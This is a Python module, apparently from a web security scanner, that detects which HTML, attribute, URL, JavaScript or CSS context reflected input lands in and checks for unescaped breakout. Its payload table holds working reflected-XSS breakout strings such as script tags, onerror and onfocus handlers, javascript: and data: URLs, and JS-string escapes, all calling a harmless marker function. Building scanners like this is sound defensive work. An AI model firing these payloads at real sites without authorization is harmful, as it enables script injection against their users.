"""Context-aware XSS payload synthesis (Phase 4 — extends Phase 3b).

Reflected XSS isn't one bug — it's a family of bugs whose breakout
payload depends on where the user input lands in the response. A
canary that reflects inside `<input value="...">` needs a different
breakout payload than one reflecting inside `<script>var x = "..."</script>`
or `<a href="...">`.

Pre-Phase-4 scan_xss had 3 fixed HTML-body payloads (`<script>`,
`<img onerror>`, `<svg onload>`). Three classic payloads cover
HTML-body reflection but miss every attribute / JS-string / URL /
CSS context. Real-world reflected XSS is unevenly distributed
across contexts; on the OWASP Juice Shop reference corpus,
attribute and JS-string contexts together outnumber HTML-body
reflections roughly 2:1.

This module:

  1. `detect_contexts(body, canary, content_type)` — locate every
     occurrence of `canary` in the response body, classify each by
     surrounding bytes, return the set of distinct contexts.
  2. `payloads_for_context(ctx)` — return the per-context breakout
     payload cohort. Each payload carries an `evidence_template`
     substring whose presence in the response confirms successful
     breakout (no escaping).
  3. `breakout_fired(body, payload, canary)` — check whether the
     payload's evidence marker appears verbatim in the response.

Contexts (priority order):

  * `html_body`           — between `>` and `<` (text node)
  * `html_attr_double`    — inside `attr="..."`
  * `html_attr_single`    — inside `attr='...'`
  * `html_attr_unquoted`  — inside `attr=...` (no quotes)
  * `url_attr`            — `href` / `src` / `formaction` / etc.
                            (subset of attr — bears a URL value)
  * `js_string_double`    — inside `"..."` in a `<script>` block
  * `js_string_single`    — inside `'...'` in a `<script>` block
  * `js_block`            — inside `<script>` but not in a string literal
  * `css`                 — inside `<style>...</style>` or `style="..."`
  * `json_reflect`        — response Content-Type is `application/json`
                            (XSS only if mis-served as `text/html`
                            — included for completeness; rare)

Heuristic, not a real HTML parser. Designed to fail-open (when the
classifier is unsure, returns `html_body` so the existing 3-payload
cohort still fires). The cost is acceptable: false-context selection
adds ~3 wasted HTTP probes per param; missed contexts is the bigger
loss.

Why not a real HTML parser? Real reflected-XSS responses are
frequently malformed (server emits broken markup precisely because
it's mishandling user input). A tolerant heuristic is more useful
than a strict parser that rejects the very pages we care about.
"""

from __future__ import annotations

from dataclasses import dataclass


__all__ = (
    "CONTEXTS",
    "XssPayload",
    "detect_contexts",
    "payloads_for_context",
    "breakout_fired",
)


CONTEXTS: tuple[str, ...] = (
    "html_body",
    "html_attr_double",
    "html_attr_single",
    "html_attr_unquoted",
    "url_attr",
    "js_string_double",
    "js_string_single",
    "js_block",
    "css",
    "json_reflect",
)


# URL-bearing attribute names. When the canary lands inside one of
# these attributes' value, the breakout cohort prefers `javascript:`
# / `data:` payloads over generic attribute-quote escapes — those
# fire even when the server escapes `"` and `'` (because no quote
# escape is needed; the URL scheme itself is the payload).
_URL_BEARING_ATTRS: frozenset[str] = frozenset({
    "href", "src", "action", "formaction", "data", "srcdoc",
    "xlink:href", "ping", "background", "poster", "manifest",
})


@dataclass(frozen=True)
class XssPayload:
    """One probe payload for a specific context.

    `template` is the payload string to inject — carries `{canary}`
    placeholder.

    `evidence_template` is the substring whose presence in the
    response body confirms successful breakout. Also carries
    `{canary}` so the evidence is uniquely attributable to this
    probe (a different probe's payload that happens to share
    syntax won't trigger a false match).
    """

    template: str
    evidence_template: str

    def materialise(self, canary: str) -> tuple[str, str]:
        """Substitute `canary` into both `template` and
        `evidence_template`. Returns `(payload, evidence_marker)`."""
        return (
            self.template.format(canary=canary),
            self.evidence_template.format(canary=canary),
        )


# ---------------------------------------------------------------------------
# Payload cohorts per context.
# ---------------------------------------------------------------------------
#
# Each evidence_template is the *minimum* substring whose verbatim
# presence in the response confirms the payload broke out of its
# enclosing context. If the server HTML-escapes the breakout
# characters (`<`, `>`, `"`, `'`), the literal evidence won't appear
# — `breakout_fired` returns False, no finding.
#
# Synthetic JS-call marker `STRIX_X(...)` is used in place of
# `alert(...)` so the probe is unambiguously identifiable in logs
# / WAFs without colliding with real `alert(...)` calls in the
# target's own JS.

_PAYLOAD_COHORTS: dict[str, tuple[XssPayload, ...]] = {
    "html_body": (
        XssPayload(
            template="<script>STRIX_X({canary})</script>",
            evidence_template="<script>STRIX_X({canary})",
        ),
        XssPayload(
            template="<img src=x onerror=STRIX_X({canary})>",
            evidence_template="<img src=x onerror=STRIX_X({canary})",
        ),
        XssPayload(
            template="<svg/onload=STRIX_X({canary})>",
            evidence_template="<svg/onload=STRIX_X({canary})",
        ),
        XssPayload(
            template="<iframe srcdoc='<script>STRIX_X({canary})</script>'>",
            evidence_template="<iframe srcdoc='<script>STRIX_X({canary})",
        ),
    ),
    "html_attr_double": (
        XssPayload(
            template='"><script>STRIX_X({canary})</script>',
            evidence_template='"><script>STRIX_X({canary})',
        ),
        XssPayload(
            template='" autofocus onfocus=STRIX_X({canary}) x="',
            evidence_template='" autofocus onfocus=STRIX_X({canary})',
        ),
        XssPayload(
            template='"><img src=x onerror=STRIX_X({canary})>',
            evidence_template='"><img src=x onerror=STRIX_X({canary})',
        ),
    ),
    "html_attr_single": (
        XssPayload(
            template="'><script>STRIX_X({canary})</script>",
            evidence_template="'><script>STRIX_X({canary})",
        ),
        XssPayload(
            template="' autofocus onfocus=STRIX_X({canary}) x='",
            evidence_template="' autofocus onfocus=STRIX_X({canary})",
        ),
    ),
    "html_attr_unquoted": (
        XssPayload(
            template=" onmouseover=STRIX_X({canary}) x=",
            evidence_template=" onmouseover=STRIX_X({canary})",
        ),
        XssPayload(
            template=" onfocus=STRIX_X({canary}) autofocus ",
            evidence_template=" onfocus=STRIX_X({canary})",
        ),
    ),
    # URL-bearing attributes accept `javascript:` and `data:` schemes
    # which fire on click / load without needing to escape the
    # enclosing quote — these work against well-encoded servers that
    # still don't validate the URL scheme.
    "url_attr": (
        XssPayload(
            template="javascript:STRIX_X({canary})",
            evidence_template="javascript:STRIX_X({canary})",
        ),
        XssPayload(
            template="data:text/html,<script>STRIX_X({canary})</script>",
            evidence_template="data:text/html,<script>STRIX_X({canary})",
        ),
    ),
    "js_string_double": (
        XssPayload(
            template='";STRIX_X({canary});//',
            evidence_template='";STRIX_X({canary})',
        ),
        XssPayload(
            template='"-STRIX_X({canary})-"',
            evidence_template='"-STRIX_X({canary})',
        ),
    ),
    "js_string_single": (
        XssPayload(
            template="';STRIX_X({canary});//",
            evidence_template="';STRIX_X({canary})",
        ),
        XssPayload(
            template="'-STRIX_X({canary})-'",
            evidence_template="'-STRIX_X({canary})",
        ),
    ),
    "js_block": (
        XssPayload(
            template="STRIX_X({canary})",
            evidence_template="STRIX_X({canary})",
        ),
        XssPayload(
            template=";STRIX_X({canary})//",
            evidence_template=";STRIX_X({canary})",
        ),
    ),
    "css": (
        XssPayload(
            template="</style><script>STRIX_X({canary})</script>",
            evidence_template="</style><script>STRIX_X({canary})",
        ),
    ),
    # JSON_REFLECT only triggers when the response is served as
    # text/html despite being JSON-shaped (a common misconfig); a
    # straight JSON response with `application/json` is not
    # exploitable, but we still probe to catch the misconfig case.
    "json_reflect": (
        XssPayload(
            template='</script><script>STRIX_X({canary})</script>',
            evidence_template='</script><script>STRIX_X({canary})',
        ),
    ),
}


def payloads_for_context(ctx: str) -> tuple[XssPayload, ...]:
    """Return the breakout payload cohort for `ctx`. Empty tuple if
    `ctx` is unknown."""
    return _PAYLOAD_COHORTS.get(ctx, ())


def breakout_fired(body: str, payload: XssPayload, canary: str) -> bool:
    """True iff the payload's evidence marker appears verbatim in
    `body`. The evidence marker carries the canary so a match is
    unambiguous attribution to this probe.

    Defence against the JS-string-escape false positive: when the
    evidence marker starts with `"` or `'` (the breakout characters
    for JS-string contexts) and the byte immediately preceding the
    match is `\\`, the server escaped the quote — JS would parse it
    as a literal char within the string, not a string terminator,
    so no breakout occurred. Scan for the next un-escaped
    occurrence.
    """
    _, evidence = payload.materialise(canary)
    if not evidence:
        return False
    start = 0
    while True:
        pos = body.find(evidence, start)
        if pos < 0:
            return False
        if pos == 0 or body[pos - 1] != "\\":
            return True
        # Preceded by `\` — server escaped the breakout quote.
        # Try the next occurrence.
        start = pos + 1


# ---------------------------------------------------------------------------
# Context detection.
# ---------------------------------------------------------------------------


def detect_contexts(
    body: str, canary: str, content_type: str = "",
) -> tuple[str, ...]:
    """Find every occurrence of `canary` in `body` and classify each.

    Returns the de-duplicated tuple of context names (one entry per
    distinct context, regardless of how many canary occurrences fell
    into that context). Empty tuple when `canary` doesn't appear.

    `content_type` is used to short-circuit on JSON responses —
    those are JSON_REFLECT context only (a straight JSON response
    is not exploitable, but probing catches text/html misconfig).
    """
    if not canary or canary not in body:
        return ()

    # JSON responses get a single context — JSON_REFLECT — and the
    # HTML-context analysis is skipped. The point is to flag
    # cases where the wrong Content-Type was set or where a /api
    # endpoint accidentally renders into a server-side template.
    if content_type and content_type.lower().lstrip().startswith("application/json"):
        return ("json_reflect",)

    contexts: set[str] = set()
    canary_len = len(canary)

    idx = 0
    while True:
        idx = body.find(canary, idx)
        if idx < 0:
            break
        ctx = _classify_single_occurrence(body, idx, canary_len)
        if ctx is not None:
            contexts.add(ctx)
        idx += canary_len

    if not contexts:
        # Reflected somewhere we couldn't classify — fall through
        # to html_body so the caller's payload cohort still fires.
        # Empirically, this happens when the response is fragmented
        # or the surrounding bytes don't match any heuristic.
        return ("html_body",)

    return tuple(sorted(contexts))


def _classify_single_occurrence(
    body: str, idx: int, canary_len: int,
) -> str | None:
    """Classify ONE canary occurrence at position `idx`. Heuristic;
    see module docstring for assumptions."""
    look_back = body[max(0, idx - 400):idx]

    # CSS first — <style>...canary...</style> overrides everything.
    if _inside_style_block(body, idx):
        return "css"

    # <script>...canary...</script> overrides HTML-tag classification
    # because the canary is consumed as JS, not as markup.
    if _inside_script_block(body, idx):
        return _classify_js_substring(look_back)

    # Walk backwards: find the last `<` and `>` before `idx`.
    last_lt = look_back.rfind("<")
    last_gt = look_back.rfind(">")

    if last_lt > last_gt:
        # We're inside a tag's attribute list.
        in_tag = look_back[last_lt:]
        return _classify_attr_substring(in_tag)

    # Otherwise we're between two tags (text node).
    return "html_body"


def _inside_script_block(body: str, idx: int) -> bool:
    """True iff the canary at `idx` falls inside an open
    `<script>...</script>` block (no closing `</script>` between
    the most-recent `<script` and `idx`)."""
    prefix = body[:idx].lower()
    open_pos = prefix.rfind("<script")
    if open_pos < 0:
        return False
    close_pos = prefix.find("</script>", open_pos)
    return close_pos < 0


def _inside_style_block(body: str, idx: int) -> bool:
    """True iff the canary at `idx` falls inside an open
    `<style>...</style>` block."""
    prefix = body[:idx].lower()
    open_pos = prefix.rfind("<style")
    if open_pos < 0:
        return False
    close_pos = prefix.find("</style>", open_pos)
    return close_pos < 0


def _classify_js_substring(look_back: str) -> str:
    """Inside a <script>...</script> block — classify whether the
    canary lands inside `"..."`, `'...'`, or in bare JS.

    Heuristic: strip backslash-escaped quotes, then count quotes
    from the opening `<script>` to the canary. Odd counts indicate
    an open string literal."""
    # Trim look_back to just-after the most-recent <script> tag so
    # we're counting quotes inside the current script block, not
    # carrying over from prior inline scripts.
    script_open = look_back.lower().rfind("<script")
    if script_open >= 0:
        # Skip past the opening tag's closing `>`.
        gt = look_back.find(">", script_open)
        if gt >= 0:
            look_back = look_back[gt + 1:]

    sanitised = look_back.replace('\\"', "").replace("\\'", "")
    n_double = sanitised.count('"')
    n_single = sanitised.count("'")

    last_double = sanitised.rfind('"')
    last_single = sanitised.rfind("'")

    in_double = n_double % 2 == 1 and (
        n_single % 2 == 0 or last_double > last_single
    )
    in_single = n_single % 2 == 1 and (
        n_double % 2 == 0 or last_single > last_double
    )

    if in_double:
        return "js_string_double"
    if in_single:
        return "js_string_single"
    return "js_block"


def _classify_attr_substring(in_tag: str) -> str:
    """The canary is inside a tag's attribute list. `in_tag` starts
    at the `<` of the enclosing tag.

    Find the LAST `=` before the canary; the canary is part of the
    value of that attribute. Inspect what follows `=` to determine
    quoting style, and walk back to the attribute name to check
    URL-bearing classification.
    """
    eq = in_tag.rfind("=")
    if eq < 0:
        # No `=` — canary is in a bare flag-style attribute or the
        # tag is malformed. Best guess: unquoted attribute.
        return "html_attr_unquoted"

    after_eq = in_tag[eq + 1:].lstrip()

    is_url_attr = _attr_name_is_url_bearing(in_tag, eq)

    if after_eq.startswith('"'):
        # canary lands inside `attr="..."` — but only if NO closing
        # `"` exists between the opening `"` and the canary.
        # If `"` already closed before canary, this `=` is from an
        # earlier attribute and we should classify as the next
        # attribute. Best-effort: assume open.
        return "url_attr" if is_url_attr else "html_attr_double"
    if after_eq.startswith("'"):
        return "url_attr" if is_url_attr else "html_attr_single"
    return "url_attr" if is_url_attr else "html_attr_unquoted"


def _attr_name_is_url_bearing(in_tag: str, eq_pos: int) -> bool:
    """Walk backwards from `eq_pos` in `in_tag` to find the attribute
    name. Return True iff it's in `_URL_BEARING_ATTRS`."""
    name_end = eq_pos
    name_start = name_end - 1
    while name_start >= 0 and in_tag[name_start] not in " \t\n\r<":
        name_start -= 1
    attr_name = in_tag[name_start + 1:name_end].strip().lower()
    return attr_name in _URL_BEARING_ATTRS
